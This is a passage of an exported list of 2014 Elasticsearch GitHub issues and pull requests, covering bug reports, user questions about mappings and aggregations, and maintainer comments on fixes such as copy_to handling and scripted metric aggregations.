    at org.elasticsearch.cluster.block.ClusterBlocks.globalBlockedRaiseException(ClusterBlocks.java:128)
    at org.elasticsearch.action.bulk.TransportBulkAction.executeBulk(TransportBulkAction.java:197)
    at org.elasticsearch.action.bulk.TransportBulkAction.access$000(TransportBulkAction.java:65)
    at org.elasticsearch.action.bulk.TransportBulkAction$1.onFailure(TransportBulkAction.java:143)
    at org.elasticsearch.action.support.TransportAction$ThreadedActionListener$2.run(TransportAction.java:119)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
```

The above cannot be caught in a catch(ClusterBlockException exception) clause.  However, when the cluster is in the same state using the node client, the ClusterBlockException can be caught for search requests.
</description><key id="39065007">7086</key><summary>ClusterBlockException cannot be caught for bulk request when using node client</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>adoptme</label><label>bug</label></labels><created>2014-07-30T06:52:21Z</created><updated>2014-07-31T15:15:39Z</updated><resolved>2014-07-31T15:15:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Does Elasticsearch not accept certain types of JSON?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7085</link><project id="" key="" /><description>I've had issues CURLing particular JSON bits to `elasticsearch-1.1.1` and elasticsearch-1.3.1`, receiving`org.elasticsearch.index.mapper.MapperParsingException: failed to parse` every time.

In particular, these 2 json lines are not ElasticSearch friendly:

```
{ "@fields": { "args": [ "filename", { "title": "that" } ] } }
{ "xxxxxx": { "yyyy": [ "zzzzzzzz", { "aaaaa": "bbbb" } ] } }
```

But I have no idea why. Is this covered in another github issue? I don't know enough about Elasticsearch to see why this isn't accepted by default -- this is with default settings (i.e. dynamic mapping).

You can find more of a synopsis at https://gist.github.com/shurane/ec54c4700bd1378f3b18
</description><key id="39041565">7085</key><summary>Does Elasticsearch not accept certain types of JSON?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">shurane</reporter><labels /><created>2014-07-29T22:13:36Z</created><updated>2014-07-31T15:22:04Z</updated><resolved>2014-07-29T22:24:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-07-29T22:24:22Z" id="50547856">Please use the mailing list for questions. You'll get a better help there.
We use github issues for ... Issues :)

That said, yyyyy can not be at the same time a String and an Object. That's why it fails here.
</comment><comment author="shurane" created="2014-07-31T15:08:19Z" id="50771958">Alright will do, should I just republish this on the elasticsearch mailing list and discontinue further conversation here? I'm not sure what you mean by "yyyy" can not be both a String and an Object. It's a key to an array inside an Object.

For instance, this works:

```
curl -XPOST http://localhost:9200/test/test/3 -d "{ "xxxxxx": { "yyyy": [] } }"
```
</comment><comment author="clintongormley" created="2014-07-31T15:22:04Z" id="50774042">an array must contain values of the same type, you have mixed strings (eg `zzzzzzzz`) with objects `{ "aaaaa": "bbbb" }`
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Geo distance filter exceptions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7084</link><project id="" key="" /><description>Hi Team,

I am trying to find a solution for the below
1. Geo boundary based search.. My index have property for lat and lon as double.. not as a  geopoint.. Here is my mapping for my index..

How do i use the lon and lat from the below mapping for geo distance filter/geo distance range filter ? 

Name    Type    Format  Store?
data            string  
getpath string  
id          double  
Region  string  
Submarket   string  
addr1   string  
addr2   string  
city    string  
citymarket  string  
country string  
countryid   long  
cultureid   long  
data    string  
details string  
fax string  
id  string  
language    string  
lat double  
lon double      

When I search for the documents.. i got the below exception..

Query : 
{
"filter": {
    "geo_distance" : {
            "distance" : "300km",
            "location" : {
                "lat" : 45,
                "lon" : -122
            }
        }  
    }
}

Exception: 
"error": "SearchPhaseExecutionException[Failed to execute phase [query], all shards failed; shardFailures {[o3f66HetT3OSpVw895w0nA][offlocations][4]: SearchParseException[[offlocations][4]: from[-1],size[-1]: Parse Failure [Failed to parse source [{\n\"filter\": {\n    \"geo_distance\" : {\n            \"distance\" : \"300km\",\n            \"location\" : {\n                \"lat\" : 45,\n                \"lon\" : -122\n            }\n        }  \n    }\n}]]]; nested:
</description><key id="39028997">7084</key><summary>Geo distance filter exceptions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">madhavtr</reporter><labels /><created>2014-07-29T20:03:06Z</created><updated>2014-07-29T20:12:55Z</updated><resolved>2014-07-29T20:12:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-07-29T20:12:55Z" id="50531547">We  Please ask questions on the [mailing-list](https://groups.google.com/forum/#!forum/elasticsearch). This issues list is for bug reports and feature requests.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add an UpdateRequest example to Java API doc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7083</link><project id="" key="" /><description>The Java API guide does not currently have an example of an UpdateRequest.  Would be nice to see an example of this in the Java API guide with scripting (to show the end user how they can specify scripting via the .scriptLang and .script methods) without having to look at the test cases (eg. https://github.com/elasticsearch/elasticsearch/blob/2024067465503a53d5292c67626998942dfffec6/src/test/java/org/elasticsearch/action/bulk/BulkRequestTests.java) :)
</description><key id="39026288">7083</key><summary>Add an UpdateRequest example to Java API doc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>docs</label><label>enhancement</label></labels><created>2014-07-29T19:33:16Z</created><updated>2014-12-03T09:44:20Z</updated><resolved>2014-12-03T09:44:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-12-03T09:44:20Z" id="65380189">Closed in favor of #8712 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] GC Disruption</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7082</link><project id="" key="" /><description>Added GC Disruption and a test simulating a long GC on a master node. If a elected master node is paused long enough that another master node is elected and then is unpaused the previous master node should eventually step down.

Also renamed DiscoveryWithNetworkFailuresTests to DiscoveryWithServiceDisruptions.

Note this PR is for the zen branch.
</description><key id="39025203">7082</key><summary>[TEST] GC Disruption</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels /><created>2014-07-29T19:21:47Z</created><updated>2015-05-18T23:30:41Z</updated><resolved>2014-07-31T08:42:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-07-30T13:11:25Z" id="50611718">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Percolator should cache index field data instances.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7081</link><project id="" key="" /><description>Before the index reader used by the percolator didn't allow to register a CoreCloseListener, but now it does, making it safe to cache index field data cache entries.

Creating field data structures is relatively expensive and caching them can save a lot of noise if many queries are evaluated in a percolator call.

Closes #6806
</description><key id="39024142">7081</key><summary>Percolator should cache index field data instances.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Percolator</label><label>enhancement</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-29T19:09:41Z</created><updated>2015-06-07T12:32:42Z</updated><resolved>2014-08-04T08:30:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-07-30T06:46:12Z" id="50579553">The change looks good to me. Should we add assertions in the percolation tests to ensure that the field data cache is empty at the end of tests?
</comment><comment author="martijnvg" created="2014-07-30T12:38:58Z" id="50608459">@jpountz Good idea, but should this be a general check? (Like how we check the circuit breaker after each test)
</comment><comment author="jpountz" created="2014-07-30T12:43:01Z" id="50608816">@martijnvg Probably!
</comment><comment author="martijnvg" created="2014-07-31T17:10:23Z" id="50788779">@jpountz I updated the PR to check if the filter cache and field data cache is 0 before stopping the test cluster.
</comment><comment author="jpountz" created="2014-08-01T07:03:03Z" id="50855114">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Better error handling on missing request body {</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7080</link><project id="" key="" /><description>```
curl -XPUT "http://localhost:9200/cs_analyzer" -d ' 
"settings": { 
"number_of_replicas": 1, 
"number_of_shards": 3, 
"analysis": { 
"analyzer": { 
"fp-analyzer": { 
"tokenizer": "path_hierarchy" 
}, 
"domain-analyzer": { 
"tokenizer": "path_hierarchy_domain" 
} 
}, 
"tokenizer": { 
"path_hierarchy": { 
"delimiter": "/", 
"type": "PathHierarchy" 
}, 
"path_hierarchy_domain": { 
"delimiter": ".", 
"type": "PathHierarchy", 
"reverse": true 
} 
} 
} 
} 
}' 
```

The above does not return an error despite the request body missing the beginning {

The index is still created but with default settings (missing the analyzers).  It would be nice to catch this and let the end user know that it did not actually create the full settings as requested.
</description><key id="39016045">7080</key><summary>Better error handling on missing request body {</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>adoptme</label><label>bug</label></labels><created>2014-07-29T17:57:34Z</created><updated>2015-11-21T16:24:24Z</updated><resolved>2015-11-21T16:24:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-29T18:00:54Z" id="50514077">I agree - it should complain about bad JSON.

Related to #2315 
</comment><comment author="clintongormley" created="2015-11-21T16:24:24Z" id="158659876">Fixed in 2.0
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix `copy_to` behavior on nested documents.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7079</link><project id="" key="" /><description>Today, `copy_to` always copies a field to the current document, which is often
wrong in the case of nested documents. For example, if you have a nested field
called `n` which has a sub-field `n.source` whose content should be copied to
`target`, then the latter field should be created in the root document instead
of the nested one, since it doesn't have `n.` as a prefix. On the contrary, if
you configure the destination field to be `n.target`, then it should go to the
nested document.

Close #6701
</description><key id="38997763">7079</key><summary>Fix `copy_to` behavior on nested documents.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-29T15:03:03Z</created><updated>2015-06-07T19:13:45Z</updated><resolved>2014-08-01T07:09:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-29T15:04:44Z" id="50488722">w00t
</comment><comment author="martijnvg" created="2014-07-29T16:16:53Z" id="50499584">Left a comment, other then that LGTM!
</comment><comment author="jpountz" created="2014-07-29T16:49:00Z" id="50504083">@martijnvg pushed a new commit
</comment><comment author="martijnvg" created="2014-07-29T19:22:56Z" id="50525101">@jpountz +1 the commit looks good
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Don't remove ancestors on deb removal</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7078</link><project id="" key="" /><description>The used -p option could result in accidentally deleting more directories
than /var/lib/elasticsearch - so this option was removed. 

Note: This only happens if the directories, but still isnt needed.

Relates #5770
</description><key id="38988076">7078</key><summary>Don't remove ancestors on deb removal</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Packaging</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-29T13:29:11Z</created><updated>2015-06-08T00:11:14Z</updated><resolved>2014-07-30T13:02:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-07-29T14:33:13Z" id="50483749">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Prefer private networking for HTTP by default, avoiding public IP bind</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7077</link><project id="" key="" /><description>This change breaks with current behavior of ES HTTP server socket binding.

The new default should be to bind HTTP only to private internet addresses
(localhost, link-local, private network RFC 1918) and to avoid
automatic public IP binds.

This change can no longer use the `null` host name for socket binding as
default. Instead, it looks up the host name by a reverse IP check and uses
`localhost` if this fails. For success, DNS must be working and configured correctly.
The IP of the host name is used for binding and for the check if the IP is
public. If the IP is public, an exception is thrown, and the HTTP socket is not
available.

A new parameter `http.public_access` must be enabled explicitly to allow
binding the HTTP port against a public IP. The default is `false`.
</description><key id="38985280">7077</key><summary>Prefer private networking for HTTP by default, avoiding public IP bind</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jprante</reporter><labels /><created>2014-07-29T12:54:43Z</created><updated>2015-06-04T16:32:14Z</updated><resolved>2015-06-04T16:32:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Test: Pick random version from backwards directory</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7076</link><project id="" key="" /><description>The upgrade tests required to specify the lower and the upper version
that it should run against. This commit adds support for random picks
if either the lower or the upper or both are not specified.
</description><key id="38984498">7076</key><summary>Test: Pick random version from backwards directory</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-29T12:43:18Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-07-29T13:50:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Scriptable Metrics Aggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7075</link><project id="" key="" /><description>A metrics aggregation which runs specified scripts at the init, collect, combine, and reduce phases

Closes #5923
</description><key id="38970332">7075</key><summary>Scriptable Metrics Aggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Aggregations</label><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-29T09:06:58Z</created><updated>2015-06-06T18:27:26Z</updated><resolved>2014-08-20T18:10:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-29T11:02:14Z" id="50462346">Looking forward to reading the docs :)
</comment><comment author="colings86" created="2014-07-29T11:08:13Z" id="50462799">@clintongormley yep.  Long way from finished yet as need to write tests and read the docs. Put the PR up as @brwe wanted to have a look at it and so others could have a play around with it but its not ready for review yet
</comment><comment author="mattweber" created="2014-07-29T14:05:34Z" id="50479776">+1!  So cool, can't wait to give this a try.  Thanks!
</comment><comment author="colings86" created="2014-07-30T08:14:58Z" id="50586438">Following gist can be followed as an example of using the scriptable metrics aggregation.

https://gist.github.com/colings86/0994f1b188b41be6052a
</comment><comment author="jpountz" created="2014-07-30T08:55:19Z" id="50589916">I left some comments but my major concern is about the client: do we need to expose it to the scripts? I'm worried that it could allow to do crazy things?
</comment><comment author="colings86" created="2014-07-30T09:06:35Z" id="50590927">@jpountz I agree that exposing the client is dangerous and it allows for some crazy things.  I spoke to @imotov about this and he said that it was something explicitly requested for the scripted facets.  I would be happy to not provide it to the scripts, it would also make the code a bit cleaner
</comment><comment author="uboness" created="2014-07-30T10:35:29Z" id="50598723">+1 on **not** exposing it... we shouldn't encourage doing crazy things with scripts
</comment><comment author="rjernst" created="2014-08-05T22:50:28Z" id="51271496">One note: expression scripts can only be used for "search", they do not allow "executable".  It looks like only the map phase uses search, and the rest executable?
</comment><comment author="colings86" created="2014-08-06T06:45:36Z" id="51299382">Yeah you are right. Actually since the expression language doesn't support assignment (i think, correct me if I am wrong) I don't think you would be able to use it even in the map script since the map script has to update some state in the params. Also, currently it is assumed that the same language is used for all the scripts in a single aggregations. I think the use cases for this aggregation are almost always going to need more complex scripts than the Lucene expression language can provide, so I see them mostly using groovy and maybe other languages through plugins
</comment><comment author="jpountz" created="2014-08-06T11:41:14Z" id="51323680">Left some comments but it looks great in general!
</comment><comment author="colings86" created="2014-08-19T13:59:11Z" id="52637675">@jpountz I made the code changes you suggested. I also updated the docs with a worked example and left some replies to your comments.  Let me know what you think.
</comment><comment author="jpountz" created="2014-08-20T14:15:50Z" id="52783805">It looks good in general, docs are great. In my opinion, the only things that need to be done before merging it would be:
- removing the aggregation context from the script context
- maybe rename `aggregation` to `_agg` in the script context as @clintongormley suggested
</comment><comment author="jpountz" created="2014-08-20T16:26:38Z" id="52803445">LGTM
</comment><comment author="diegoasth" created="2014-10-06T20:30:49Z" id="58091847">Great News! I am trying to use a scripted metric aggregation inside a date_histogram aggregation but unfortunately it seems to take docs outside the date-bucket into consideration, but this is not what I expected..
</comment><comment author="diegoasth" created="2014-10-06T20:34:17Z" id="58092541">{
   "size": 0,
   "aggs": {
      "histo": {
         "date_histogram": {
            "field": "timestamp",
            "interval": "1h",
            "min_doc_count": 0,
            "format": "yyyy-MM-dd HH:mm"
         },
         "aggs": {
            "profit": {
               "scripted_metric": {
                  "init_script": " _agg['kpiA'] =0;",
                  "map_script": "_agg.kpiA += doc['kpiA'].value; ",
                  "combine_script": "teste =0; teste += _agg.kpiA; return teste;",
                  "reduce_script": "profit = 0; for (a in _aggs) { profit += a;}; return profit;"
               }
            }
         }
      }
   }
}
</comment><comment author="colings86" created="2014-10-07T07:41:14Z" id="58147959">@diegoasth I have tried to reproduce the issue your are seeing in the gist below [1], in both 1.4 and in the master branch, without success. Could you take a look at the gist and try it on your system to see if it reproduces your issue.  If not, could you create a similar gist to illustrate the steps to reproduce the issue you are seeing?

[1] https://gist.github.com/colings86/d1a9c76898b4b2783b89
</comment><comment author="diegoasth" created="2014-10-08T18:23:36Z" id="58403364">Hi @colings86 , thanks or your attention.

in deed, our gist does not reproduce the issue, so I created another one that shows it. My goal is to use a scripted_metric inside a date_histogram (let me know if it is not possible). I expect that the scripts (init_script, map_script, combine_script and reduce_script) consider **only** the documents in that specific date-bucket. For the sake of comparison, I used the native SUM aggregation inside the date_histogram and it worked fine, returning the expected results per bucket.

https://gist.github.com/diegoasth/406148525616f9f527ab
</comment><comment author="colings86" created="2014-10-09T07:52:56Z" id="58474676">@diegoasth this is indeed a bug. Thanks for raising it and for providing the steps to reproduce it. I'll look into getting it fixed
</comment><comment author="colings86" created="2014-10-09T12:20:32Z" id="58500817">@diegoasth I have raised the following issue for this bug:

https://github.com/elasticsearch/elasticsearch/issues/8036
</comment><comment author="diegoasth" created="2014-10-09T13:22:28Z" id="58507831">thank you very much. The ability to wite my custom aggregations (inside ES) is a very awaited feature.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Add basic upgrade test script</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7074</link><project id="" key="" /><description>This commit adds a basic full cluster restart upgrade script that tests
upgrades of elasticsearch across major version. In contrast to the BWC
tests we are running using the java test framework this test uses a python
script as well as the REST APIs to ensure upgrades across major version work and
indices are compatible.

The upgrade test starts 2 or more nodes of an old elasticserach version, indexes
a random number of documents into the running nodes and executes a full cluster restart.
After the nodes are recovered a small set of basic checks are executed to ensure all
documents are still searchable and field data can be loaded etc.
</description><key id="38967207">7074</key><summary>Resiliency: Add basic upgrade test script</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>resiliency</label><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-29T08:17:37Z</created><updated>2015-06-06T18:27:35Z</updated><resolved>2014-07-29T11:02:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-07-29T09:11:16Z" id="50452468">LGTM

This is also a nice (expert) example of using the Python client.

Thank you for upgrading to Python 3 and adding the install instructions; I was able to run this successfully!  For some reason I struggle to install elasticsearch python client under Python 2.x: I hit a strange exception from "pip install elasticsearch".
</comment><comment author="jpountz" created="2014-07-29T09:39:28Z" id="50455420">Worked for me on both python 2.6.1 and 3.4.0. Would be nice to have a message confirming that everything went well on the standard out when the test ends?
</comment><comment author="jpountz" created="2014-07-29T09:58:53Z" id="50457057">LGTM
</comment><comment author="martijnvg" created="2014-07-29T10:04:59Z" id="50457606">Tested it with python 2.7 and 3.4 and it works well. LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Multitype search returns empty result for non-English queries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7073</link><project id="" key="" /><description>I have `geo` index containing `country` and `city` document types. Each of them have `name_en`, `name_ru`, etc. fields indexed with corresponding analyzers.
I use `multi_match` query to search across these fields.

Searching a country in English goes fine:

```
curl -XGET 'http://localhost:9200/geo/country/_search?pretty' -d '{ query: { multi_match: { fields: ["name*"], query: "Austria" } } }'
```

returns:

``` JSON
{
  "id":4,
  "slug":"austria",
  "code":"AT",
  "name_en":"Austria",
  "name_de":"&#214;sterreich",
  "name_ru":"&#1040;&#1074;&#1089;&#1090;&#1088;&#1080;&#1103;",
  "name_it":"Austria",
  "name_es":"Austria",
  "name_fr":"Autriche",
  "name_zh":"&#22885;&#22320;&#21033;"
}
```

The same result is for Russian variant:

```
curl -XGET 'http://localhost:9200/geo/country/_search?pretty' -d '{ query: { multi_match: { fields: ["name*"], query: "&#1040;&#1074;&#1089;&#1090;&#1088;&#1080;&#1103;" } } }'
```

The multiple-type query is also OK in English:

```
curl -XGET 'http://localhost:9200/geo/city,country/_search?pretty' -d '{ query: { multi_match: { fields: ["name*"], query: "Austria" } } }'
```

But the same query with Russian (or any other language except English) query string suddenly returns empty result:

```
curl -XGET 'http://localhost:9200/geo/city,country/_search?pretty' -d '{ query: { multi_match: { fields: ["name*"], query: "&#1040;&#1074;&#1089;&#1090;&#1088;&#1080;&#1103;" } } }'
```

It seems very strange to me. Can it be a bug or am I doing something wrong?

P.S. Here is the gist with responses and mapping: https://gist.github.com/durnoyabsurd/c0c2c643c97812c7316a
</description><key id="38964547">7073</key><summary>Multitype search returns empty result for non-English queries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">feymartynov</reporter><labels /><created>2014-07-29T07:29:05Z</created><updated>2014-07-29T10:51:42Z</updated><resolved>2014-07-29T10:51:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-29T10:51:42Z" id="50461523">The problem is that you have two `name_ru` fields: one in `country` with a `russian` analyzer, and one in `city` with the `standard` analyzer.  You're searching across both types, so it is choosing one of them, in this case, `city.name_ru`.

Fields with the same name in different types should have the same mapping.

Closed in favour of #4081 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Cann't executing "min" aggregations on elasticsearch-1.3.0</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7072</link><project id="" key="" /><description>While I was using the elasticsearch-1.3.0 to execute the "min" aggregation on my data, I encountered the following error:

```
{
  "error" : "SearchPhaseExecutionException[Failed to execute phase [query], all shards failed; shardFailures {[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.25][2]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.25][1]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.25][4]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.25][3]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.24][4]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.24][3]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.24][2]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.24][1]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.24][0]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}{[0R5SQ6L9SU-aHFUGLvZNhQ][logstash-2014.07.25][0]: ClassCastException[org.elasticsearch.index.fielddata.plain.PagedBytesIndexFieldData cannot be cast to org.elasticsearch.index.fielddata.IndexNumericFieldData]}]",
  "status" : 500
}
```

This is what I tried:

```
curl -XPOST 'localhost:9200/logstash-2014.07.25,logstash-2014.07.24/_search?pretty' -d '{
  "size": 0,
    "aggs" : {
        "min_remain" : { "min" : { "field" : "remain" } }
    }
}'
```

Here is how my data looks like:

```
{
  ...
  "_source": {
    "message": "25/Jul/2014:12:07:12 +0800 \"20140725\" \"25248617\" \"0\" \"0\" \"1238\" \"1\" \"video\" \"some\" \"2\" \"19\" \"\" \"tv\" ",
    "@version": "1",
    "@timestamp": "2014-07-25T04:07:12.000Z",
    "host": "test.com",
    "type": "test_add_log",
    "timestamp": "25/Jul/2014:12:07:12 +0800",
    "addtime": "20140725",
    "uid": "25248617",
    "n1": "0",
    "n2": "0",
    "remain": "1238",
    "get": "1",
    "rule": "\"video\"",
    "meaning": "\"some\"",
    "cycle": "2",
    "times": "19",
    "desc": "\"\"",
    "platform": "\"tv\""
  },
  ...
}
```

I tried to "min" on field "get",  and I got the same error.
I tried to "sum" on field "get", and I got the same error.
What's wrong with my query?
And the "group" works:

```
curl -XPOST 'localhost:9200/logstash-2014.07.25,logstash-2014.07.24/_search?pretty' -d '{
  "size": 0,
  "aggs": {
    "group_by_platform": {
      "terms": {
        "field": "platform"
      }
    }
  }
}'
```
